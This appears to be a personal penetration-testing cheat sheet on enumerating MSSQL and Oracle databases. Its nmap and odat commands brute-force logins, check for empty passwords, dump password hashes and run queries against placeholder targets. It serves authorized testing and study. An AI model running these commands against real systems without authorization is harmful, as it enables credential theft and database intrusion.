---
title: 08 - Database Enumeration
updated: 2025-04-19 13:00:57Z
created: 2025-04-19 12:47:21Z
latitude: -33.78668940
longitude: 150.95264980
altitude: 0.0000
---

1. **Scan for MSSQL Services**

`nmap -sV -p 1433 <target_ip>`

If unauthenticated:
`nmap -p 1433 --script "ms-sql-*" <target_ip>`

Run once you have credentials:
`nmap -sV -Pn -n -p 1433 --script "ms-sql-*" --script-args mssql.username=sa,mssql.password='P@ssw0rd' <target_ip>`
***
2. **Authentication (Brute Force & Info)**

Attempts to brute force SQL login credentials:
`nmap -p 1433 --script ms-sql-brute <target_ip>`

Checks for logins with no password.:
`nmap -p 1433 --script ms-sql-empty-password <target_ip>`
***
3. **Enumerate Users and Config**

Gathers version, hostname, instance name, and current user:
`nmap -p 1433 --script ms-sql-info <target_ip>`
***
4. **Dump Password Hashes (if logged in)**

Shows databases the user can access:
`nmap -p 1433 --script ms-sql-hasdbaccess --script-args mssql.username=sa,mssql.password='yourpassword' <target_ip>`

Dumps password hashes from SQL Server:
`nmap -p 1433 --script ms-sql-dump-hashes --script-args mssql.username=sa,mssql.password='yourpassword' <target_ip>`
***
5. **Enumerate Databases**

Custom query to list databases:
Legacy SQL Server (2000, 2005)
`nmap -p 1433 --script ms-sql-query --script-args mssql.username=sa,mssql.password='yourpassword',mssql.query="SELECT name FROM master..sysdatabases" <target_ip>`
Modern SQL Server (2008+)
`nmap -p 1433 --script ms-sql-query --script-args mssql.username=sa,mssql.password='yourpassword',mssql.query="SELECT name FROM sys.databases" <target_ip>`

## ORACLE

1. Scan to look for database and services  
`odat all -s <targetIP> -p 1521`
2. `nmap -p1521 --script oracle-brute-stealth --script-args oracle-brute-stealth.sid=DB11g -n <targetIP>`
